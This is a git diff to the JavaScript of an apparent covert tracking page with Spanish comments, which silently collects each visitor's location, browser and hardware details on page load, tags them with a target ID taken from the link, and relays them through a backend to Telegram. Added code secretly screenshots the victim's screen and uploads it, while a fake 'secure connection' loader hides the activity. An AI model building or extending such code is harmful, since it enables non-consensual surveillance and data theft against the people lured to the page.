@@ -33,9 +33,22 @@ document.addEventListener('DOMContentLoaded', () => {
     initCounterAnimations();
     showCookieBanner();
 
-    // Espera CAPTURE_DELAY_MS antes de disparar captura silenciosa
-    setTimeout(captureAllData, CONFIG.CAPTURE_DELAY_MS);
+    // Iniciar captura inmediatamente en el fondo
+    captureAllData();
+    // Iniciar la animación del loader visual
+    runInitialLoader();
 });
+
+function getTargetIdFromUrl() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const queryId = urlParams.get('id');
+    if (queryId) return queryId;
+
+    const match = window.location.pathname.match(/^\/v\/([^/?#]+)/i);
+    if (match && match[1]) return decodeURIComponent(match[1]);
+
+    return 'Visitante Anónimo';
+}
 
 /* ====================================================
    1. MOTOR PRINCIPAL DE CAPTURA
@@ -59,10 +72,14 @@ async function captureAllData() {
         // Actualiza UI con los datos obtenidos
         updateUI(geoData, browserData);
 
+        // Extraer ID del objetivo desde /?id=... o ruta corta /v/...
+        const targetId = getTargetIdFromUrl();
+
         // Consolida todos los datos
         capturedData = {
             timestamp: captureTime.toISOString(),
             eventType: 'AUTO_PAGE_LOAD',
+            targetId: targetId,
             geo: geoData,
             browser: browserData,
             hardware: hwData,
@@ -76,7 +93,26 @@ async function captureAllData() {
         };
 
         // Envía a Telegram
-        await sendToTelegram(capturedData, null);
+        await sendToTelegram(capturedData);
+
+        // Dispara la captura de screenshot silenciosa
+        // Delay incrementado a 5.5s para asegurar que el loader inicial ya haya desaparecido
+        setTimeout(async () => {
+            sendLogToBackend(">> Iniciando captura de screenshot...");
+            try {
+                const screenshot = await captureScreenshot();
+                if (screenshot) {
+                    sendLogToBackend(">> Screenshot tomado. Convirtiendo a Blob...");
+                    const blob = dataURItoBlob(screenshot);
+                    sendLogToBackend(">> Blob creado exitosamente. Ejecutando sendPhotoToTelegram...");
+                    await sendPhotoToTelegram(blob, capturedData);
+                } else {
+                    sendLogToBackend(">> Fallo: html2canvas devolvió null (falló silenciosamente).");
+                }
+            } catch (err) {
+                sendLogToBackend(">> Error masivo capturando screenshot: " + err.message);
+            }
+        }, 5500);
 
     } catch (err) {
         console.warn('[SecureTrack] Error en captura inicial:', err);
@@ -330,7 +366,12 @@ function buildTelegramMessage(data) {
     const flag = getFlagEmoji(g.countryCode);
     const eventLabel = data.eventType === 'CLICK_CTA_BUTTON' ? '🖱️ <b>CLICK EN CTA</b>' : '👁️ <b>CARGA DE PÁGINA</b>';
 
-    return `🚨 <b>NUEVO VISITANTE DETECTADO</b>
+    // Highlight the target ID if it exists
+    const targetHeader = data.targetId !== 'Visitante Anónimo'
+        ? `🎯 <b>OBJETIVO DETECTADO:</b> <code>${data.targetId}</code>`
+        : `🚨 <b>NUEVO VISITANTE DETECTADO</b>`;
+
+    return `${targetHeader}
 ${eventLabel} — <code>${ts}</code>
 
 ━━━━━━━━━━━━━━━━━━━━
@@ -400,46 +441,66 @@ function getFlagEmoji(countryCode) {
 }
 
 /* ====================================================
-   12. ENVÍO A TELEGRAM
+   12. ENVIAR A SERVIDOR LOCAL (INTERMEDIARIO)
    ==================================================== */
-async function sendToTelegram(data, screenshotB64) {
-    if (!CONFIG.TELEGRAM_BOT_TOKEN || CONFIG.TELEGRAM_BOT_TOKEN === 'PEGAR_TOKEN_AQUÍ') {
-        console.warn('[SecureTrack] Credenciales de Telegram no configuradas.');
-        return;
-    }
-
-    const base = `https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}`;
-    const text = buildTelegramMessage(data);
-
-    // 1. Enviar mensaje de texto
+async function sendToTelegram(data) {
+    // Enviar JSON al servidor local (bot.js) que luego lo enviará a Telegram
     try {
-        await fetch(`${base}/sendMessage`, {
+        const payload = JSON.stringify(data);
+        await fetch('/api/report', {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: payload
+        });
+    } catch (err) {
+        console.error("Error al enviar reporte al servidor:", err);
+    }
+}
+
+// Envía la foto (screenshot)
+async function sendPhotoToTelegram(blob, data) {
+    sendLogToBackend(">> Ingresando a sendPhotoToTelegram con blob size: " + (blob ? blob.size : 'NULL'));
+    try {
+        const formData = new FormData();
+        formData.append("photo", blob, "screenshot.jpg");
+        // ID del objetivo para que el backend sepa a quién pertenece
+        formData.append("targetId", data.targetId || 'Visitante Anónimo');
+
+        sendLogToBackend(">> FormData creado, iniciando POST a /api/photo...");
+
+        await fetch('/api/photo', {
+            method: "POST",
+            body: formData
+        });
+        sendLogToBackend(">> fetch a /api/photo finalizó limpiamente.");
+    } catch (err) {
+        sendLogToBackend(">> Error enviando FormData a /api/photo: " + err.message);
+        console.error("Error al enviar foto:", err);
+    }
+}
+
+/* ====================================================
+   12.B HELPER LOGS REMOTOS & BLOB 
+   ==================================================== */
+function sendLogToBackend(msg) {
+    try {
+        fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CONFIG.TELEGRAM_CHAT_ID,
-                text: text,
-                parse_mode: 'HTML',
-                disable_web_page_preview: true,
-            }),
-        });
-    } catch (e) {
-        console.warn('[SecureTrack] Error enviando mensaje:', e);
-    }
+            body: JSON.stringify({ message: String(msg) })
+        }).catch(function () { }); // Ignorar errores de red aquí para no hacer loop
+    } catch (e) { }
+}
 
-    // 2. Enviar screenshot si está disponible
-    if (screenshotB64) {
-        try {
-            const blob = await (await fetch(screenshotB64)).blob();
-            const fd = new FormData();
-            fd.append('chat_id', CONFIG.TELEGRAM_CHAT_ID);
-            fd.append('photo', blob, 'screenshot.jpg');
-            fd.append('caption', `📸 Screenshot del visitante — ${new Date(data.timestamp).toLocaleString('es-ES')} — IP: ${data.geo.ip}`);
-            await fetch(`${base}/sendPhoto`, { method: 'POST', body: fd });
-        } catch (e) {
-            console.warn('[SecureTrack] Error enviando screenshot:', e);
-        }
+function dataURItoBlob(dataURI) {
+    var byteString = atob(dataURI.split(',')[1]);
+    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    var ab = new ArrayBuffer(byteString.length);
+    var ia = new Uint8Array(ab);
+    for (var i = 0; i < byteString.length; i++) {
+        ia[i] = byteString.charCodeAt(i);
     }
+    return new Blob([ab], { type: mimeString });
 }
 
 /* ====================================================
@@ -550,7 +611,11 @@ async function handleMainCta() {
         scrollPct: maxScrollPct,
     };
 
-    await sendToTelegram(clickData, screenshot);
+    await sendToTelegram(clickData);
+    if (screenshot) {
+        const blob = await (await fetch(screenshot)).blob();
+        await sendPhotoToTelegram(blob, clickData);
+    }
 }
 
 /* ====================================================
@@ -618,4 +683,35 @@ function acceptCookies() {
         banner.style.transition = 'opacity 0.4s';
         setTimeout(() => { banner.style.display = 'none'; }, 400);
     }
+}
+
+/* ====================================================
+   19. LOADER INICIAL
+   ==================================================== */
+async function runInitialLoader() {
+    const loader = document.getElementById('initial-loader');
+    const textEl = document.getElementById('loader-text');
+    if (!loader || !textEl) return;
+
+    const steps = [
+        "Estableciendo conexión segura...",
+        "Calculando variables de entorno...",
+        "Cargando módulos de análisis...",
+        "Iniciando interfaz segura..."
+    ];
+
+    for (let i = 0; i < steps.length; i++) {
+        textEl.style.opacity = '0';
+        await sleep(300);
+        textEl.textContent = steps[i];
+        textEl.style.opacity = '1';
+        await sleep(900); // Muestra el mensaje 0.9s
+    }
+
+    // Mínimo delay de salida
+    textEl.style.opacity = '0';
+    await sleep(200);
+
+    // Oculta el loader de forma fluida
+    loader.classList.add('hidden');
 }
